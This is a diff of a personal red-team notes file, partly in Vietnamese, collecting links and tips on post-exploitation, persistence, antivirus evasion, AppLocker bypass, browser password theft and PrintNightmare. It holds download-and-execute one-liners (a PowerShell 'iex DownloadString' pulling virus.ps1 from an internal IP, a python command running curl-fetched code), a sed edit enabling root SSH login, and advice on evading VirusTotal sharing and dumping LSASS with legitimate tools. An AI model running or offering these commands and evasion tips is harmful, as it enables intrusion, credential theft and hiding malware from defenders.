@@ -1,8 +1,11 @@
+https://orange-cyberdefense.github.io/ocd-mindmaps/
+https://www.hackingarticles.in/red-teaming/
 https://viblo.asia/p/ky-thuat-post-exploitation-trong-red-team-p1-linux-Ny0VGjXYLPA --> keylogger,bypass antivirus   .bashrc .vimrc file
 https://viblo.asia/p/share-libraries-hijacking-tren-linux-gAm5yEVX5db  --> lib injection
 
-https://viblo.asia/p/ky-thuat-persistence-trong-red-teaming-phan-1-x7Z4D6ryLnX#_persistence-with-suid-binary-3
-https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
+https://viblo.asia/p/domain-fronting-an-giau-luu-luong-c2-E375zAkblGW
+https://viblo.asia/p/ky-thuat-persistence-trong-red-teaming-phan-1-x7Z4D6ryLnXhttps://viblo.asia/p/gioi-thieu-ve-kiem-thu-xam-nhap-phan-6-persistence-Yym40n2dL91
+https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/   #old cannot use
 
 https://viblo.asia/p/linux-lateral-movement-leo-quyen-ngang-tren-linux-1Je5EzX1KnL  --> decode rsa_id
 write the log of ssh
@@ -11,17 +14,17 @@ https://aidanstansfield.github.io/2020/05/15/sharkyctf-penteeeeest.html#exploiti
 sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config  #ssh login as root
 
 https://anonyviet.com/cach-cai-dat-va-su-dung-cobalt-strike-danh-cho-red-team/
+https://anonyviet.com/anvrs-cong-cu-reverse-shell-bypass-antivirus/
 
 https://viblo.asia/p/bypass-applocker-tren-windows-XL6lAen4lek
+$executioncontext.sessionstate.languagemode
+ConstrainedLanguage  --> blocked
+https://github.com/padovah4ck/PSByPassCLM
+
 https://quantrimang.com/cong-nghe/giau-du-lieu-trong-1-tap-tin-van-ban-bi-mat-72691
 dir /r    #detact
-
-https://quantrimang.com/cong-nghe/trojan-gia-lam-pdf-bang-phuong-phap-rlo-195731 fake pdf (anti virus blocked)
-
-https://viblo.asia/p/bypass-powershell-execution-policies-tren-windows-MG24BrER4z3
-(kỹ thuật này vô hiệu hóa các phần mềm diệt Virus thông thường)
-powershell -nop -c "iex (New-Object Net.WebClient).DownloadString ('http://10.0.37.216:8080/virus.ps1')"
-python -c "`curl https://raw.githubusercontent.com/Shengpy/test/main/a.py`"
+https://blog.viettelcybersecurity.com/canh-bao-chien-dich-tan-cong-cua-nhom-apt-darkpink-nham-den-vao-nuoc-dong-nam-a/?fbclid=IwAR0G9NS1DgOexSymY4LUDfEYNVsWdVtSAHPyTkJgF8c-mHSHQqiU47I-EFo
+Shorcut -> Shorcut -> Key
 
 https://nhattruong.blog/2022/12/25/tan-cong-social-engineering-toan-tap-part-2/ ---social engineering
 
@@ -35,13 +38,40 @@ chèn thêm rất nhiều byte 0 vào cuối để tăng kích thước lên tr�
 https://cookiearena.org/case-study/phan-tich-ma-doc-tan-cong-doanh-nghiep-ban-hang-online/
 
 VirusTotal hay mách lẻo, nếu nó phát hiện phần mềm của chúng ta là độc hại. Nó sẽ chia sẻ hash cho tất cả các phần mềm AV khác được biết. Điều này tốt cho người dùng nhưng không tốt cho Pentester . Cho nên antiscan.me là lựa chọn tốt hơn (tuy rằng công cụ này cũng rất giỏi vòi tiền)
-#-------------------------------------------------bypass antivirus
+
+https://quantrimang.com/cong-nghe/trojan-gia-lam-pdf-bang-phuong-phap-rlo-195731 fake pdf (anti virus blocked)
+
 https://viblo.asia/p/bypass-powershell-execution-policies-tren-windows-MG24BrER4z3
+(kỹ thuật này vô hiệu hóa các phần mềm diệt Virus thông thường)
+powershell -nop -c "iex (New-Object Net.WebClient).DownloadString ('http://10.0.37.216:8080/virus.ps1')"
+python -c "`curl https://raw.githubusercontent.com/Shengpy/test/main/a.py`"
+
+https://drx.home.blog/2018/07/20/tu-viet-chuong-trinh-danh-cap-password-duoc-luu-trong-chrome-bang-python/#more-122 
+https://github.com/ohyicong/decrypt-chrome-passwords
+password stealing from browser
+#-------------------------------------------------bypass antivirus
+https://viblo.asia/p/cac-phuong-phap-bypass-av-co-ban-bWrZnQgvKxw?fbclid=IwAR0eoXpUIZRrPgTTEargMDwlJyrsBSkOQEuAsjPxP0ZAUzOrRAsezbyG7tM
 https://topdev.vn/blog/huong-dan-cai-dat-clamav-tren-linux-de-quet-virus-malware-trojan/
+https://0xdf.gitlab.io/2020/02/01/htb-re.html
+https://github.com/danielbohannon/Invoke-Obfuscation   #powershell obfuscation
+
+https://docs.google.com/presentation/d/1Fdcbv9U1qywIZSl2AhXJAlx61pyEITKfcbbwpJMvkcQ/edit#slide=id.g8d8b1cad0d_1_27
+1.Use non-malicious software in malicious ways (preferred)
+Instead of Metasploit’s psexec implementation, use PsExec.exe from Microsoft
+Instead of Mimikatz.exe, dump LSASS memory with Task Manager and extract passwords elsewhere
+Instead of hashdump, save out registry hives and extract hashes elsewhere
+Instead of meterpreter (at first), use SSH, Remote Desktop, mRemote-NG, TeamViewer, etc.
+2.Add extra strings (from legitimate software) to increase the “goodness” score
 #------------------------------------------------------------------tool
 https://websitehcm.com/10-phan-mem-keylogger-mien-phi-tot-nhat/
 https://nhattruong.blog/2022/10/27/mot-so-payload-khi-test-truong-email/  --test email
 #-------------------------------------------------scan system
 https://anonyviet.com/cach-quet-lo-hong-he-thong-bang-mitre-attck/
-
-thư mục startup của Windows
+---------------------------------------------print vuln -> priv
+https://www.4rth4s.xyz/2021/09/learning-printnightmare-cve-2021-1675.html
+https://github.com/cube0x0/CVE-2021-1675
+----------------------------------active directory
+havoc
+https://viblo.asia/p/gia-lap-tan-cong-mang-voi-infection-monkey-2oKLn85g4QO
+--------------------------------------------printer
+https://viblo.asia/p/leo-thang-dac-quyen-thong-qua-windows-access-token-GrLZDo8gKk0#_22-bien-dich-va-chay-ma-4
